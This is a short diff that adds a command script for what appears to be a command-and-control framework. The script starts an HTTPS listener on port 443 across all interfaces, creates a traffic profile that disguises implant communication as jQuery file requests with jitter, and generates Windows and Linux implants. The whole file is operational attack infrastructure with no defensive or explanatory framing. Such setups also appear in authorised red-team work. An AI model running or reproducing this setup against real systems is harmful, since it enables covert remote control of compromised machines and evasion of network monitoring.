@@ -1,0 +1,9 @@
+# Generate default listener and profile
+http --addr 0.0.0.0 --port 443 --secure --cert /opt/c2/cert.crt --key /opt/c2/cert.key
+
+# Create a profile that mimics jQuery traffic
+new-profile --profile-name jquery --http "jquery-3.3.1.min.js" --jitter 37
+
+# Generate implants with the profile
+generate --profile jquery --os windows --arch amd64 --save /opt/c2/implants/
+generate --profile jquery --os linux --arch amd64 --save /opt/c2/implants/
